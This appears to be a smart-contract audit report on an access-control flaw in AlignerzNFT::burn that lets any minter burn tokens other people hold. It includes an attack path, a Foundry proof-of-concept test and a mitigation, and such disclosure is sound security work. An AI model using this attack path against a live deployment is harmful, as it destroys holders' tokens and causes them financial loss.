# [000742]  Improper Access Control Logic in AlignerzNFT::burn Allows A Minter To Burn Another Minter's Token
  
  ### Summary

The `AlignerzNFT::burn` function uses a onlyMinter modifier as its form of access control, but this is improper as this modifier allows any other minter in `minters` mapping to burn another minter's token



### Root Cause

The current access control logic allows anyone in the `minters` mapping to burn any other minter's token
```solidity
 function burn(uint256 tokenId) external whenNotPaused onlyMinter { //@> Any other minter can burn another minter's token
        require(_exists(tokenId), "ALIGNERZ: Token Id does not exist");
        _burn(tokenId);
    }
``` 

### Internal Pre-conditions

1. Attacker must be in `minters` mapping

### External Pre-conditions

1. The attacker must have their address listed in the `minters` mapping 

### Attack Path

1. An attacker obtains `minter` privileges by being added by `Owner`
2. The attacker scans the blockchain to find a high-value token held by another minter
3. The attacker calls `AlignerzNFT::burn` on the victim's `tokenId`

### Impact

1. Leads to financial losses for token holders

### PoC

The following test passed with this log: ```Ran 1 test for test/PoC.t.sol:AlignerzNFTTest
[PASS] test_FLAW_MinterCanBurnTokenTheyDoNotOwn() (gas: 117677)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 40.98ms (19.40ms CPU time)```
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
// Adjust the import path based on your project structure (e.g., "../src/AlignerzNFT.sol")
import {AlignerzNFT} from "../../src/contracts/nft/AlignerzNFT.sol";


contract AlignerzNFTTest is Test {
    AlignerzNFT public nft;
    address public owner = makeAddr("owner");
    address public minter = makeAddr("minter");
    address public tokenHolder = makeAddr("tokenHolder");

    uint256 public constant TOKEN_ID = 1; // ERC721A starts at 1 by default

    function setUp() public {
        // Deploy the contract as the 'owner'
        vm.prank(owner);
        nft = new AlignerzNFT(
            "AlignerzNFT",
            "ALZ",
            "https://api.alignerz.com/"
        );

        // Setup: The 'owner' adds the 'minter' account as a minter
        vm.prank(owner);
        nft.addMinter(minter);
    }

    /**
     * @notice This test proves the flaw: a minter can burn a token they do not own.
     */
    function test_FLAW_MinterCanBurnTokenTheyDoNotOwn() public {
        // Arrange: The 'minter' mints a new token directly to the 'tokenHolder'
        vm.prank(minter);
        nft.mint(tokenHolder);

        // Verify 'tokenHolder' is the owner of TOKEN_ID 1
        assertEq(
            nft.ownerOf(TOKEN_ID),
            tokenHolder,
            "Token holder should be the owner"
        );
        // Also verify their balance is 1
        assertEq(
            nft.balanceOf(tokenHolder),
            1,
            "Token holder's balance should be 1"
        );

        // Act: The 'minter' (who is not the owner) calls burn() on the token
        vm.prank(minter);
        nft.burn(TOKEN_ID);
        // Assert: The transaction SUCCEEDS (does not revert), which is the flaw.

        // Verify the token is gone by checking the balance
        // This is the alternative assertion you asked for.
        assertEq(
            nft.balanceOf(tokenHolder),
            0,
            "Token holder's balance should be 0 after burn"
        );
    }

    /**
     * @notice This test proves the consequence of the flaw:
     * The token's actual owner cannot burn their own token.
     */
    function test_FLAW_TokenHolderCannotBurnTheirOwnToken() public {
        // Arrange: The 'minter' mints a new token to the 'tokenHolder'
        vm.prank(minter);
        nft.mint(tokenHolder);

        // Verify 'tokenHolder' is the owner
        assertEq(
            nft.ownerOf(TOKEN_ID),
            tokenHolder,
            "Token holder should be the owner"
        );

        // Act: The 'tokenHolder' (the actual owner) attempts to burn their own token.
        // Assert: The transaction REVERTS with the minter error.
        vm.prank(tokenHolder);
        vm.expectRevert(bytes("Caller is not the minter"));
        nft.burn(TOKEN_ID);
    }

    /**
     * @notice This test just confirms the logic as-written:
     * The owner can burn any token because they are a minter by default.
     */
    function test_OwnerCanBurnAnyToken() public {
        // Arrange: The 'minter' mints a new token to the 'tokenHolder'
        vm.prank(minter);
        nft.mint(tokenHolder);

        // Verify 'tokenHolder' is the owner
        assertEq(
            nft.ownerOf(TOKEN_ID),
            tokenHolder,
            "Token holder should be the owner"
        );

        // Act: The 'owner' (who is a minter from the constructor) burns the token.
        vm.prank(owner);
        nft.burn(TOKEN_ID);
        // Assert: This succeeds, as expected by the flawed logic.

        // Verify the token is gone by checking the balance
        assertEq(
            nft.balanceOf(tokenHolder),
            0,
            "Token holder's balance should be 0 after owner burn"
        );
    }

}
```

### Mitigation

The `Alignerz::burn` function's access control should be removed from the `minter` role and given to the token's ownerr
  